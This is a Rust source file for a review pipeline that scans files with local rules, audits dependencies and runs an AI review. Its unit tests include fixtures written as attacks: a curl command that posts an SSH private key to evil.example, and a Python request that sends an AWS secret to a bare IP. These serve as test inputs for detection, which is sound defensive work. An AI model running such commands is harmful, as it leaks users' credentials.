//! The review pipeline shared by every command: local rules, dependency
//! audit, then the OpenCode review.

use crate::agent::{self, AgentError, SourceFile};
use crate::config::Settings;
use crate::config::model::{AgentSettings, AiRequirement, Named, SourceClass};
use crate::deps;
use crate::osv;
use crate::report::{AgentOutcome, AgentRun, Gap, LocalFinding, NetworkRequest, Report};
use crate::rules::{self, RuleId, Scheme};
use crate::scan::{self, FileKind, ScanConfig, TextFile};
use crate::tools::OpenCode;

const EXCERPT_CHARS: usize = 180;
const LFS_POINTER: &str = "version https://git-lfs.github.com/spec/v1";

/// What one review runs against: the settings, the class the target itself
/// belongs to, and where to find OpenCode.
pub struct ReviewContext<'a> {
    pub settings: &'a Settings,
    pub class: SourceClass,
    pub opencode: &'a OpenCode,
}

/// Reviews a file or directory tree as one source class.
pub fn review_tree(config: &ScanConfig, context: &ReviewContext<'_>) -> Report {
    let mut report = Report::new(config.root.display().to_string());
    report.class = context.class;
    report.profile = context
        .settings
        .profile_for(context.class)
        .name()
        .to_string();
    report.agent_input_limit = context
        .settings
        .agent_settings(context.class)
        .max_input_bytes;
    report.ai_off_classes = ai_off_classes(context.settings, &[context.class]);

    let (snapshot, walk_gaps) = scan::walk(config, &mut |file: TextFile<'_>| {
        analyze_text(&mut report, file.rel, file.text, true);
    });
    report.snapshot = snapshot;
    report.gaps.extend(walk_gaps);
    if report.text_files_reviewed == 0 {
        report.gaps.push(Gap::NoReviewableFiles);
    }

    audit_dependencies(&mut report);
    run_agents(&mut report, context.settings, context.opencode);
    report
}

/// The subset of `classes` whose resolved policy has `ai = off`.
pub fn ai_off_classes(settings: &Settings, classes: &[SourceClass]) -> Vec<SourceClass> {
    classes
        .iter()
        .copied()
        .filter(|class| settings.policy(*class).ai == AiRequirement::Off)
        .collect()
}

/// Applies the local checks to one text file and queues it for the AI review.
pub fn analyze_text(report: &mut Report, rel: &str, text: &str, inspect_dependencies: bool) {
    report.text_files_reviewed += 1;

    if text.lines().next() == Some(LFS_POINTER) {
        report.gaps.push(Gap::UnresolvedLfs(rel.to_string()));
    }
    queue_for_agent(report, rel, text);

    let documentation = rules::is_documentation(rel);
    let inventory_network = rules::is_executable_or_runtime_config(rel);
    for (index, line) in text.lines().enumerate() {
        let number = index + 1;
        if inventory_network {
            record_network(report, rel, number, line);
        }
        if !documentation {
            let lowered = line.to_lowercase();
            for rule in rules::line_rules(&lowered) {
                push_finding(report, rel, number, line, rule);
            }
        }
    }

    if inspect_dependencies {
        deps::inspect(&mut report.dependencies, &mut report.gaps, rel, text);
    }
}

fn queue_for_agent(report: &mut Report, rel: &str, text: &str) {
    if report.ai_off_classes.contains(&report.class_of(rel)) {
        return;
    }
    if rules::is_sensitive_path(rel) {
        report.gaps.push(Gap::SensitiveWithheld(rel.to_string()));
        return;
    }

    let size = rel.len() + text.len();
    if report.agent_input_size + size > report.agent_input_limit {
        if !report.agent_input_overflowed {
            report.agent_input_overflowed = true;
            report.gaps.push(Gap::AgentInputTooLarge);
        }
        return;
    }
    report.agent_input_size += size;
    report.agent_input.push(SourceFile {
        path: rel.to_string(),
        content: text.to_string(),
    });
}

fn record_network(report: &mut Report, rel: &str, number: usize, line: &str) {
    for (scheme, host) in rules::extract_network_destinations(line) {
        if !rules::is_local_host(&host) {
            if scheme == Scheme::Http {
                push_finding(report, rel, number, line, RuleId::CleartextNetworkRequest);
            }
            if rules::is_ip_host(&host) {
                push_finding(report, rel, number, line, RuleId::DirectIpNetworkRequest);
            }
        }
        report.network.push(NetworkRequest {
            path: rel.to_string(),
            line: number,
            scheme,
            host,
        });
    }
}

fn push_finding(report: &mut Report, rel: &str, number: usize, line: &str, rule: RuleId) {
    report.findings.push(LocalFinding {
        path: rel.to_string(),
        line: number,
        rule,
        excerpt: line.trim().chars().take(EXCERPT_CHARS).collect(),
    });
}

fn audit_dependencies(report: &mut Report) {
    deps::check_coverage(&report.dependencies, &mut report.gaps);
    let packages = report.dependencies.packages();
    if packages.is_empty() {
        return;
    }
    match osv::audit(packages) {
        Ok(audit) => report.audit = Some(audit),
        Err(error) => report.gaps.push(Gap::Dependency(format!(
            "OSV dependency audit failed: {error}"
        ))),
    }
}

/// Runs the AI review for every file whose class policy wants one. Files
/// whose classes resolve to the same agent settings share one call. An
/// oversized or truncated input is already incomplete, so nothing is sent.
pub fn run_agents(report: &mut Report, settings: &Settings, opencode: &OpenCode) {
    let has_oversized = report.snapshot.count(FileKind::OversizedText) > 0;
    if report.agent_input.is_empty() || report.agent_input_overflowed || has_oversized {
        return;
    }

    let mut groups: Vec<(AgentSettings, Vec<SourceFile>)> = Vec::new();
    for file in &report.agent_input {
        let class = report.class_of(&file.path);
        if settings.policy(class).ai == AiRequirement::Off {
            continue;
        }

        let agent_settings = settings.agent_settings(class);
        match groups
            .iter_mut()
            .find(|(existing, _)| *existing == agent_settings)
        {
            Some((_, files)) => files.push(file.clone()),
            None => groups.push((agent_settings, vec![file.clone()])),
        }
    }

    for (agent_settings, files) in groups {
        let outcome = match opencode.resolve() {
            Err(error) => AgentOutcome::Unavailable(error),
            Ok(binary) => match agent::review(&binary, &files, &agent_settings) {
                Ok(review) => AgentOutcome::Reviewed(review),
                Err(AgentError::Unavailable(error)) => AgentOutcome::Unavailable(error),
                Err(AgentError::Invalid(error)) => {
                    report.gaps.push(Gap::Agent(error));
                    continue;
                }
            },
        };
        report.agent_runs.push(AgentRun {
            files: files.into_iter().map(|file| file.path).collect(),
            label: agent_settings.label(),
            outcome,
        });
    }
}

#[cfg(test)]
mod tests {
    use std::fs;
    use std::path::PathBuf;

    use super::{ReviewContext, ai_off_classes, analyze_text, review_tree, run_agents};
    use crate::agent::Status;
    use crate::config::Settings;
    use crate::config::file::{AgentDefaults, PartialConfig, PartialPolicy};
    use crate::config::model::{AiRequirement, Profile, SourceClass, builtin};
    use crate::report::{AgentOutcome, AgentRun, Blocked, Decision, Gap, Report};
    use crate::rules::RuleId;
    use crate::scan::ScanConfig;
    use crate::test_support::{TempDir, mock_opencode};
    use crate::tools::OpenCode;

    fn unavailable() -> OpenCode {
        OpenCode::At(PathBuf::from("/nonexistent/opencode"))
    }

    fn rules_in(report: &Report) -> Vec<RuleId> {
        report.findings.iter().map(|finding| finding.rule).collect()
    }

    fn context<'a>(
        settings: &'a Settings,
        class: SourceClass,
        opencode: &'a OpenCode,
    ) -> ReviewContext<'a> {
        ReviewContext {
            settings,
            class,
            opencode,
        }
    }

    fn default_settings() -> Settings {
        Settings::from_parts(PartialConfig::default(), PartialConfig::default())
    }

    #[test]
    fn reports_cleartext_ip_and_credential_exfiltration() {
        let mut report = Report::new("test");
        analyze_text(
            &mut report,
            "src/send.py",
            "requests.post('http://198.51.100.8/upload', data=os.environ['AWS_SECRET_ACCESS_KEY'])\n",
            true,
        );

        assert_eq!(report.network.len(), 1);
        assert_eq!(report.network[0].host, "198.51.100.8");
        let rules = rules_in(&report);
        assert!(rules.contains(&RuleId::CredentialExfiltration));
        assert!(rules.contains(&RuleId::CleartextNetworkRequest));
        assert!(rules.contains(&RuleId::DirectIpNetworkRequest));

        let mut tls = Report::new("test");
        analyze_text(
            &mut tls,
            "client.py",
            "requests.get('https://api.example.test', verify=False)\n",
            true,
        );
        assert_eq!(rules_in(&tls), [RuleId::DisabledTlsVerification]);
    }

    #[test]
    fn documentation_is_reviewed_by_the_agent_but_not_the_local_rules() {
        let mut report = Report::new("test");
        analyze_text(
            &mut report,
            "README.md",
            "Install with `sudo pacman -S foo` and add it to ~/.bashrc.\n",
            true,
        );
        assert!(report.findings.is_empty());
        assert_eq!(report.agent_input.len(), 1);
    }

    #[test]
    fn sensitive_files_are_withheld_and_incomplete() {
        let mut report = Report::new("test");
        analyze_text(&mut report, ".env", "TOKEN=x\n", true);
        assert!(report.agent_input.is_empty());
        assert!(matches!(
            report.gaps.as_slice(),
            [Gap::SensitiveWithheld(_)]
        ));
    }

    #[test]
    fn agent_input_is_bounded() {
        let mut report = Report::new("test");
        let chunk = "a".repeat(200 * 1024);
        analyze_text(&mut report, "one.txt", &chunk, false);
        analyze_text(&mut report, "two.txt", &chunk, false);
        analyze_text(&mut report, "three.txt", &chunk, false);

        assert_eq!(report.agent_input.len(), 1);
        assert!(report.agent_input_overflowed);
        assert_eq!(
            report
                .gaps
                .iter()
                .filter(|gap| matches!(gap, Gap::AgentInputTooLarge))
                .count(),
            1
        );
    }

    #[test]
    fn unresolved_git_lfs_pointer_makes_the_scan_incomplete() {
        let dir = TempDir::new("lfs");
        fs::write(
            dir.path().join("theme-background.png"),
            "version https://git-lfs.github.com/spec/v1\noid sha256:deadbeef\nsize 12345\n",
        )
        .unwrap();

        let settings = default_settings();
        let report = review_tree(
            &ScanConfig::new(dir.path()),
            &context(&settings, SourceClass::Source, &unavailable()),
        );
        assert_eq!(
            report.decide(&|class| builtin(Profile::Strict, class)),
            Decision::Blocked(Blocked::Incomplete)
        );
        assert!(
            report
                .gaps
                .iter()
                .any(|gap| matches!(gap, Gap::UnresolvedLfs(_)))
        );
    }

    #[test]
    fn malicious_theme_is_flagged_and_a_failed_agent_is_incomplete() {
        let dir = TempDir::new("theme");
        fs::write(dir.path().join("colors.toml"), "background = '#000000'\n").unwrap();
        fs::write(
            dir.path().join("hyprland.lua"),
            "os.execute(\"curl -X POST -d @~/.ssh/id_ed25519 https://evil.example\")\n",
        )
        .unwrap();

        let settings = default_settings();
        let report = review_tree(
            &ScanConfig::new(dir.path()),
            &context(&settings, SourceClass::Source, &unavailable()),
        );
        let rules = rules_in(&report);
        assert!(rules.contains(&RuleId::ShellCommandExecution));
        assert!(rules.contains(&RuleId::CredentialFileAccess));
        assert!(rules.contains(&RuleId::CredentialExfiltration));
        assert!(matches!(
            report.agent_runs[0].outcome,
            AgentOutcome::Unavailable(_)
        ));
        assert_eq!(
            report.decide(&|class| builtin(Profile::Strict, class)),
            Decision::Blocked(Blocked::AiUnavailable)
        );
    }

    #[test]
    fn a_clean_tree_with_a_clear_agent_review_is_clear() {
        let dir = TempDir::new("clean");
        let bin = TempDir::new("clean-bin");
        fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();

        let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));
        let settings = default_settings();
        let report = review_tree(
            &ScanConfig::new(dir.path()),
            &context(&settings, SourceClass::Source, &opencode),
        );
        assert!(report.gaps.is_empty(), "{:?}", report.gaps);
        assert!(matches!(
            report.agent_runs.as_slice(),
            [AgentRun { outcome: AgentOutcome::Reviewed(review), .. }] if review.status == Status::Clear
        ));
        assert_eq!(
            report.decide(&|class| builtin(Profile::Strict, class)),
            Decision::Clear
        );
    }

    #[test]
    fn a_tree_under_a_secrets_directory_is_not_withheld() {
        let parent = TempDir::new("outer");
        let dir = parent.path().join("secrets").join("project");
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join("main.lua"), "print('hi')\n").unwrap();

        let settings = default_settings();
        let report = review_tree(
            &ScanConfig::new(&dir),
            &context(&settings, SourceClass::Source, &unavailable()),
        );
        assert!(
            !report
                .gaps
                .iter()
                .any(|gap| matches!(gap, Gap::SensitiveWithheld(_)))
        );
        assert_eq!(report.agent_input.len(), 1);
    }

    #[test]
    fn local_only_never_calls_the_agent() {
        let dir = TempDir::new("local-only");
        let bin = TempDir::new("local-only-bin");
        fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();
        let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));
        let settings = default_settings().with_profile(Profile::LocalOnly);

        let report = review_tree(
            &ScanConfig::new(dir.path()),
            &context(&settings, SourceClass::Theme, &opencode),
        );

        assert!(report.agent_runs.is_empty());
        assert!(!bin.path().join("stdin").exists());
        assert_eq!(
            report.decide(&|class| settings.policy(class)),
            Decision::Clear
        );
    }

    #[test]
    fn the_input_limit_comes_from_settings() {
        let dir = TempDir::new("input-limit");
        fs::write(dir.path().join("big.txt"), "a".repeat(40 * 1024)).unwrap();
        let system = PartialConfig {
            agent: AgentDefaults {
                max_input_kib: Some(16),
                ..AgentDefaults::default()
            },
            ..PartialConfig::default()
        };
        let settings = Settings::from_parts(system, PartialConfig::default());

        let report = review_tree(
            &ScanConfig::new(dir.path()),
            &context(&settings, SourceClass::Source, &unavailable()),
        );
        assert!(report.agent_input_overflowed);
    }

    #[test]
    fn classes_with_equal_agent_settings_share_one_run() {
        let bin = TempDir::new("grouped-bin");
        let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));
        let settings = default_settings();

        let mut report = Report::new("transaction");
        report.class = SourceClass::ThirdPartyRepo;
        report
            .file_classes
            .insert("a/.INSTALL".into(), SourceClass::Official);
        report
            .file_classes
            .insert("b/.INSTALL".into(), SourceClass::LocalPackage);
        report
            .file_classes
            .insert("c/.INSTALL".into(), SourceClass::ThirdPartyRepo);
        for path in ["a/.INSTALL", "b/.INSTALL", "c/.INSTALL"] {
            analyze_text(&mut report, path, "post_install() { true; }\n", false);
        }

        run_agents(&mut report, &settings, &opencode);

        // Official uses low thinking; the other two share high thinking.
        assert_eq!(report.agent_runs.len(), 2);
        let files: Vec<&[String]> = report
            .agent_runs
            .iter()
            .map(|run| run.files.as_slice())
            .collect();
        assert!(files.contains(&&["a/.INSTALL".to_string()][..]));
    }

    #[test]
    fn ai_off_skips_agent_input_gaps() {
        let dir = TempDir::new("agent-disabled");
        fs::write(dir.path().join(".env"), "TOKEN=x\n").unwrap();
        fs::write(dir.path().join("big.txt"), "a".repeat(40 * 1024)).unwrap();
        let system = PartialConfig {
            agent: AgentDefaults {
                max_input_kib: Some(16),
                ..AgentDefaults::default()
            },
            ..PartialConfig::default()
        };
        let settings =
            Settings::from_parts(system, PartialConfig::default()).with_profile(Profile::LocalOnly);

        let report = review_tree(
            &ScanConfig::new(dir.path()),
            &context(&settings, SourceClass::Theme, &unavailable()),
        );

        assert!(report.gaps.is_empty(), "{:?}", report.gaps);
        assert_eq!(
            report.decide(&|class| settings.policy(class)),
            Decision::Clear
        );
    }

    #[test]
    fn ai_off_classes_in_a_mixed_report_are_not_queued() {
        let system = PartialConfig {
            classes: vec![(
                SourceClass::Official,
                PartialPolicy {
                    ai: Some(AiRequirement::Off),
                    ..PartialPolicy::default()
                },
            )],
            ..PartialConfig::default()
        };
        let settings = Settings::from_parts(system, PartialConfig::default());

        let mut report = Report::new("transaction");
        report.class = SourceClass::ThirdPartyRepo;
        report.agent_input_limit = 16 * 1024;
        report.ai_off_classes = ai_off_classes(
            &settings,
            &[SourceClass::Official, SourceClass::ThirdPartyRepo],
        );
        assert_eq!(report.ai_off_classes, [SourceClass::Official]);

        report
            .file_classes
            .insert("core/a/.INSTALL".into(), SourceClass::Official);
        analyze_text(
            &mut report,
            "core/a/.INSTALL",
            &"a".repeat(40 * 1024),
            false,
        );
        analyze_text(
            &mut report,
            "chaotic/b/.INSTALL",
            "post_install() { true; }\n",
            false,
        );

        let queued: Vec<&str> = report
            .agent_input
            .iter()
            .map(|file| file.path.as_str())
            .collect();
        assert_eq!(queued, ["chaotic/b/.INSTALL"]);
        assert!(!report.agent_input_overflowed);
        assert!(report.gaps.is_empty(), "{:?}", report.gaps);
    }
}
